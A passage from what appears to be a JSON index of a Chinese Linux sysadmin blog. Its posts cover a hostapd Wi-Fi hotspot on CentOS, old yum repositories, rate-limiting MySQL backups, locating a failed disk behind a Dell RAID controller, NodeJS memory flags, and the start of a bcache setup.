class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e系统启动，进入cdrom安装，选择Troubleshooting\u003c/p\u003e","title":"Ext4分区的缩小"},{"content":"自己的笔记本是装了个CentOS的系统，然后上面跑了个Vmware，又装了Win10，然后接两个屏幕，小的是linux跑gnome，大的是Win10屏幕，这样干活的。\n路由更是混乱无比，网卡有tun0 / wlan0 / eth0 ，没有弄br0，这是大前提。如果弄br0的话，得改一堆东西。\n这样的话wlan0无线网卡不联网就空闲了，于是想把无线网卡做AP共享出来，给手机用，做法真是比较复杂，弄了2天才弄好，网上的教程都是莫名啊，不太适合CentOS。\n其实就是安装hostpapd，把做法记录一下：\n首先不想改动已有的网络，那么桥接这条路就彻底断了，只能在无线网卡上做DHCP+NAT一条路了。\n先检查网络：\nlspci -k | grep -A 3 -i \u0026#34;network\u0026#34; 03:00.0 Network controller: Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01) Subsystem: Lite-On Communications Inc Device 0662 Kernel driver in use: ath9k Kernel modules: ath9k 看到自己的网卡驱动是ath9k，再看看模块\nmodinfo ath9k | grep \u0026#39;depend\u0026#39; depends: mac80211,ath9k_hw,ath9k_common,cfg80211,ath mac80211, cfg80211看到这个就放心了，driver就是nl80211\n再确认一下，里面有* AP 字样这样就没问题了：\niw list|grep -A8 \u0026#34;Supported interface modes:\u0026#34; Supported interface modes: * IBSS * managed * AP * AP/VLAN * WDS * monitor * P2P-client * P2P-GO 首先看看自己的无线网卡物理地址，30:10:B3:6A:22:AA记下来\nifconfig -a ...... wlan0 Link encap:Ethernet HWaddr 30:10:B3:6A:22:AA ...... 再看看自己的缺省路由网卡，是虚拟网卡tun0，也记下来\nroute -n ...... 0.0.0.0 10.10.0.9 0.0.0.0 UG 0 0 0 tun0 ...... 下载hostapd并安装，如果提示libnl没装，那就补装一下\nwget http://mirrors.ustc.edu.cn/epel/6/x86_64/hostapd-2.0-7.el6.x86_64.rpm yum -y install hostapd-2.0-7.el6.x86_64.rpm 禁止掉NetworkManager对无线网卡的管理\nvi /etc/NetworkManager/NetworkManager.conf ...... #在文件最后加两行 [keyfile] unmanaged-devices=mac:30:10:B3:6A:22:AA 然后瞬间大家就可以在gnome的桌面网卡里看到无线网卡失联了，这就对了！\n编辑/etc/hostapd/hostapd.conf\nvi /etc/hostapd/hostapd.conf interface=wlan0 driver=nl80211 ssid=dontMessWithVincentValentine hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=3 wpa_passphrase=KeePGuessinG wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 注意，上面hwmode是无线工作的模式，g、b、a都可以，一般是g，channel是信道，找个没多少人用的信道最好，11、6、3、1都可以。interface就是无线网卡了，wlan0。ssid和wpapassphrase按你的需求来设置即可。\nok，然后运行:\nrfkill unblock all rfkill是控制无线和蓝牙的开关，我们放行一切，否则hostapd无法启动。\n现在，启动hostapt测试一下\nhostapd /etc/hostapd/hostapd.conf 没有意外的话，就应该成功了。但这只是做了一半，首先改改dnsmasq，给无线网卡分配地址\nvi /etc/dnsmasq.conf interface=wlan0 bind-interfaces listen-address=192.168.0.1 #no-dhcp-interface= dhcp-range=192.168.0.2,192.168.0.224,12h dhcp-option=3,192.168.0.1 dhcp-option=6,223.5.5.5 注意，我的dnsmasq.conf就只有这么7行，没有别的了。里面很简单，首先dhcp是放到了wlan0上并分配地址，dhcp-option中3表示网关，gateway；6表示dns，这里设置的是阿里的公共dns 223.5.5.5。\n剩下的我们就写个脚本来完成吧： 内容其实就是\n解除无线block 配置wlan0的ip为192.168.0.1 启动dnsmasq 做iptable的nat 注意里面我是用的tun0，如果你的缺省路由是eth0，改了即可。 vi /usr/local/bin/initSoftAP.sh #!/bin/bash start() { rfkill unblock all ifconfig wlan0 up 192.168.0.1 netmask 255.255.255.0 sleep 2 if [ -z \u0026#34;$(ps -e | grep dnsmasq)\u0026#34; ] then dnsmasq fi #Enable NAT iptables -F iptables -X iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE #Thanks to lorenzo #Uncomment the line below if facing problems while sharing PPPoE, see lorenzo\u0026#39;s comment for more details #iptables -I FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu sysctl -w net.ipv4.ip_forward=1 #start hostapd hostapd -B /etc/hostapd/hostapd.conf } stop() { service iptables stop service dnsmasq stop pkill hostapd /sbin/ip link set down dev wlan0 } case $1 in start) start ;; stop) stop ;; *) echo \u0026#34;Usage: $0 {start|stop}\u0026#34; exit 2 esac ok, 这么就搞定了。\n#启动 /usr/local/bin/initSoftAP.sh start #停止 /usr/local/bin/initSoftAP.sh stop ","permalink":"https://rendoumi.com/posts/20240123-centos_wifiap/","summary":"\u003cp\u003e自己的笔记本是装了个CentOS的系统，然后上面跑了个Vmware，又装了Win10，然后接两个屏幕，小的是linux跑gnome，大的是Win10屏幕，这样干活的。\u003c/p\u003e\n\u003cp\u003e路由更是混乱无比，网卡有tun0 / wlan0 / eth0 ，没有弄br0，这是大前提。如果弄br0的话，得改一堆东西。\u003c/p\u003e\n\u003cp\u003e这样的话wlan0无线网卡不联网就空闲了，于是想把无线网卡做AP共享出来，给手机用，做法真是比较复杂，弄了2天才弄好，网上的教程都是莫名啊，不太适合CentOS。\u003c/p\u003e\n\u003cp\u003e其实就是安装\u003ccode\u003ehostpapd\u003c/code\u003e，把做法记录一下：\u003c/p\u003e\n\u003cp\u003e首先不想改动已有的网络，那么桥接这条路就彻底断了，只能在无线网卡上做DHCP+NAT一条路了。\u003c/p\u003e\n\u003cp\u003e先检查网络：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elspci -k \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -A \u003cspan class=\"m\"\u003e3\u003c/span\u003e -i \u003cspan class=\"s2\"\u003e\u0026#34;network\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e03:00.0 Network controller: Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter \u003cspan class=\"o\"\u003e(\u003c/span\u003erev 01\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Subsystem: Lite-On Communications Inc Device \u003cspan class=\"m\"\u003e0662\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Kernel driver in use: ath9k\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Kernel modules: ath9k\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看到自己的网卡驱动是ath9k，再看看模块\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emodinfo ath9k \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s1\"\u003e\u0026#39;depend\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edepends:        mac80211,ath9k_hw,ath9k_common,cfg80211,ath  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003emac80211, cfg80211看到这个就放心了，driver就是nl80211\u003c/p\u003e\n\u003cp\u003e再确认一下，里面有* AP 字样这样就没问题了：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiw list\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep -A8 \u003cspan class=\"s2\"\u003e\u0026#34;Supported interface modes:\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Supported interface modes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * IBSS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * managed\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * AP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * AP/VLAN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * WDS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * monitor\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * P2P-client\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * P2P-GO\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e首先看看自己的无线网卡物理地址，30:10:B3:6A:22:AA记下来\u003c/p\u003e","title":"CentOS下做无线AP热点"},{"content":"前同事N年前买了个linode的主机，一直用，系统是CentOS 5.6 x86_64的。\n现在想在上面装个软件，结果yum失效了，重装系统不可能，只能找个旧的yum源设置一下了。\n源： http://vault.centos.org ，找到子目录\ncat /etc/yum.repos.d/base.repo [base] name=base baseurl=http://vault.centos.org/5.6/os/x86_64/ gpgcheck=0 enabled=1 最后清掉一下缓存就可以了\nyum clean all ","permalink":"https://rendoumi.com/posts/20240123-centos_yum_old/","summary":"\u003cp\u003e前同事N年前买了个linode的主机，一直用，系统是CentOS 5.6 x86_64的。\u003c/p\u003e\n\u003cp\u003e现在想在上面装个软件，结果yum失效了，重装系统不可能，只能找个旧的yum源设置一下了。\u003c/p\u003e\n\u003cp\u003e源： \u003ca href=\"http://vault.centos.org/\"\u003ehttp://vault.centos.org\u003c/a\u003e ，找到子目录\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/yum.repos.d/base.repo  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003ebase\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebase  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebaseurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://vault.centos.org/5.6/os/x86_64/  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003egpgcheck\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eenabled\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最后清掉一下缓存就可以了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum clean all  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"给老旧的CentOS系统设置yum源"},{"content":"公司的MySQL服务器定时在凌晨4:00准时开始备份。\n结果是会触发报警，net流量增高，cpu增高，磁盘io增高，这个是属于正常的，如何避免触发警报呢？\n有4种方法：\n一、优化io和cpu，让备份写磁盘的速度降下来，平稳的写入 nice -n 10 ionice -c2 -n 7 /usr/bin/mysqldump -S /var/lib/mysql/mysql.sock -uroot --single-transaction --quick\\ --triggers -R --hex-blob --log-error=$db.log --databases $db \u0026gt; $basedir/$backdir/$db.sql 二、加快备份速度，多线程，让报警触发之前就结束备份 COMMIT_COUNT=0 COMMIT_LIMIT=10 for DB in `cat ListOfDatabases.txt` do mysqldump -h... -u... -p... --hex-blob --routines --triggers ${DB} | gzip \u0026gt; ${DB}.sql.gz \u0026amp; (( COMMIT_COUNT++ )) if [ ${COMMIT_COUNT} -eq ${COMMIT_LIMIT} ] then COMMIT_COUNT=0 wait fi done if [ ${COMMIT_COUNT} -gt 0 ] then wait fi 三、用cstream来控制流速 -t = throughput in bytes/sec 1000000是一兆，每秒只允许写一兆\nmysqldump --single-transaction --quick -u \u0026lt;USER\u0026gt; -p\u0026lt;PASS\u0026gt; \u0026lt;Database\u0026gt; | cstream -t 1000000 \u0026gt; backup.sql 四、用pv来控制流速 \u0026ndash;rate-limit Limit the transfer to a maximum of RATE bytes per second. 单位可以是：1k 1m 1g 1t\nmysqldump --single-transaction --quick -u -p | pv --rate-limit 1m \u0026gt; db.sql ","permalink":"https://rendoumi.com/posts/20240123-mysql_backup_optimize/","summary":"\u003cp\u003e公司的MySQL服务器定时在凌晨4:00准时开始备份。\u003c/p\u003e\n\u003cp\u003e结果是会触发报警，net流量增高，cpu增高，磁盘io增高，这个是属于正常的，如何避免触发警报呢？\u003c/p\u003e\n\u003cp\u003e有4种方法：\u003c/p\u003e\n\u003ch4 id=\"一优化io和cpu让备份写磁盘的速度降下来平稳的写入\"\u003e一、优化io和cpu，让备份写磁盘的速度降下来，平稳的写入\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enice -n \u003cspan class=\"m\"\u003e10\u003c/span\u003e ionice -c2 -n \u003cspan class=\"m\"\u003e7\u003c/span\u003e /usr/bin/mysqldump -S /var/lib/mysql/mysql.sock -uroot --single-transaction --quick\u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --triggers -R --hex-blob --log-error\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$db\u003c/span\u003e.log --databases \u003cspan class=\"nv\"\u003e$db\u003c/span\u003e \u0026gt; \u003cspan class=\"nv\"\u003e$basedir\u003c/span\u003e/\u003cspan class=\"nv\"\u003e$backdir\u003c/span\u003e/\u003cspan class=\"nv\"\u003e$db\u003c/span\u003e.sql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"二加快备份速度多线程让报警触发之前就结束备份\"\u003e二、加快备份速度，多线程，让报警触发之前就结束备份\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCOMMIT_COUNT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCOMMIT_LIMIT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e10\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e DB in \u003cspan class=\"sb\"\u003e`\u003c/span\u003ecat ListOfDatabases.txt\u003cspan class=\"sb\"\u003e`\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edo\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    mysqldump -h... -u... -p... --hex-blob --routines --triggers \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDB\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e gzip \u0026gt; \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDB\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e.sql.gz \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e((\u003c/span\u003e COMMIT_COUNT++ \u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCOMMIT_COUNT\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e -eq \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCOMMIT_LIMIT\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eCOMMIT_COUNT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003ewait\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCOMMIT_COUNT\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e -gt \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ethen\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003ewait\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"三用cstream来控制流速\"\u003e三、用cstream来控制流速\u003c/h4\u003e\n\u003cp\u003e-t = throughput in bytes/sec\n1000000是一兆，每秒只允许写一兆\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqldump --single-transaction --quick -u \u0026lt;USER\u0026gt; -p\u0026lt;PASS\u0026gt; \u0026lt;Database\u0026gt; \u003cspan class=\"p\"\u003e|\u003c/span\u003e cstream -t \u003cspan class=\"m\"\u003e1000000\u003c/span\u003e \u0026gt; backup.sql  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"四用pv来控制流速\"\u003e四、用pv来控制流速\u003c/h4\u003e\n\u003cp\u003e\u0026ndash;rate-limit Limit the transfer to a maximum of RATE bytes per second.\n单位可以是：1k 1m 1g 1t\u003c/p\u003e","title":"MySQL的备份网络优化"},{"content":"公司的Dell R720XD服务器是用来做Hadoop大数据的。\n其中有两块300G的硬盘做Raid1，作为系统盘。\n剩下3块硬盘是4TB，都是独立的，没有做任何Raid，单独做数据盘。\n但是，这三块硬盘都被 Dell H330 的Raid控制器控制，于是3块硬盘呢，其实每个都是个单独的 Raid0\n去机房巡检的过程中，发现一个硬盘亮黄灯。\n从idrac口可以看到坏了个硬盘\n问题来了，三块啊，到底是哪块坏了呢？\n注意上图，修订是：GS0F，序列号是：Z1Z83DXH\n我了个擦，所有硬盘都被h330接管，所以lspci什么也看不出来，只能看出是个lsi的MegaRAID！！！\nlspci|grep Mega 02:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS-3 3008 [Fury] (rev 02) 没办法，先去下个MegaCLI吧: MegaCli.tgz\ncd /opt/MegaRAID tar zxvf MegaCli.tgz 再下个python, mega-status.py\nchmod 755 mega-status.py ./mega-status.py 注意这个脚本是引用了64位的megacli\ndef_megaclipath = \u0026#34;/opt/MegaRAID/MegaCli/MegaCli64\u0026#34; 看运行结果啊\n这里把修订和序列号连在一起了： GS0FZ1Z83DXH 对应c0u2p0，对应上面的c0u2，对应右边的/dev/sdc\n所以是/dev/sdc坏掉了。\n搞定。\n这样就可以先卸载/dev/sdc，然后换盘了。\n","permalink":"https://rendoumi.com/posts/20240123-dell_disk/","summary":"\u003cp\u003e公司的Dell R720XD服务器是用来做Hadoop大数据的。\u003c/p\u003e\n\u003cp\u003e其中有两块300G的硬盘做Raid1，作为系统盘。\u003c/p\u003e\n\u003cp\u003e剩下3块硬盘是4TB，都是独立的，没有做任何Raid，单独做数据盘。\u003c/p\u003e\n\u003cp\u003e但是，这三块硬盘都被 Dell H330 的Raid控制器控制，于是3块硬盘呢，其实每个都是个单独的 \u003ccode\u003eRaid0\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e去机房巡检的过程中，发现一个硬盘亮黄灯。\u003c/p\u003e\n\u003cp\u003e从idrac口可以看到坏了个硬盘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240123142237915\" loading=\"lazy\" src=\"/posts/20240123-dell_disk/image-20240123142237915.png\"\u003e\u003c/p\u003e\n\u003cp\u003e问题来了，三块啊，到底是哪块坏了呢？\u003c/p\u003e\n\u003cp\u003e注意上图，修订是：GS0F，序列号是：Z1Z83DXH\u003c/p\u003e\n\u003cp\u003e我了个擦，所有硬盘都被h330接管，所以lspci什么也看不出来，只能看出是个lsi的MegaRAID！！！\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elspci\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep Mega  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS-3 \u003cspan class=\"m\"\u003e3008\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eFury\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003erev 02\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e没办法，先去下个MegaCLI吧: \u003ca href=\"MegaCli.tgz\"\u003eMegaCli.tgz\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /opt/MegaRAID\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf MegaCli.tgz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e再下个python, \u003ca href=\"mega-status.py\"\u003emega-status.py\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e mega-status.py  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./mega-status.py\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意这个脚本是引用了64位的megacli\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edef_megaclipath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/opt/MegaRAID/MegaCli/MegaCli64\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看运行结果啊\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240123142400354\" loading=\"lazy\" src=\"/posts/20240123-dell_disk/image-20240123142400354.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里把修订和序列号连在一起了： GS0FZ1Z83DXH 对应c0u2p0，对应上面的c0u2，对应右边的/dev/sdc\u003c/p\u003e\n\u003cp\u003e所以是/dev/sdc坏掉了。\u003c/p\u003e\n\u003cp\u003e搞定。\u003c/p\u003e\n\u003cp\u003e这样就可以先卸载/dev/sdc，然后换盘了。\u003c/p\u003e","title":"Dell R730XD服务器如何确定是哪块硬盘坏了"},{"content":"NodeJS默认64位机器GC是有1.4G内存，所以，如果是512或者128兆内存的小vps，立时就不灵了。\n需要加参数\n--max_old_space_size=128 --optimize_for_size 一句话搞定。\n","permalink":"https://rendoumi.com/posts/20240123-nodejs_gc/","summary":"\u003cp\u003e\u003ccode\u003eNodeJS\u003c/code\u003e默认64位机器GC是有1.4G内存，所以，如果是512或者128兆内存的小vps，立时就不灵了。\u003c/p\u003e\n\u003cp\u003e需要加参数\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--max_old_space_size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e128\u003c/span\u003e --optimize_for_size\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e一句话搞定。\u003c/p\u003e","title":"小微vps下运行nodejs需要注意的gc"},{"content":"\n如上图，数据写到硬盘有两种方式，一种是Bcache用SSD做缓冲，加速最后的硬盘读写。另一种是直接读写硬盘，bypass模式。我们用的是第一种Bcache。\n安装：\n$ yum install bcache-tools /dev/sda是硬盘，/dev/sdb是ssd， 首先把两个盘的数据都擦干净了\n$ wipefs -a /dev/sda1 ; wipefs -a /dev/sdb1 格式化hdd和ssd，注意参数不同\n$ make-bcache -B /dev/sda1 ; 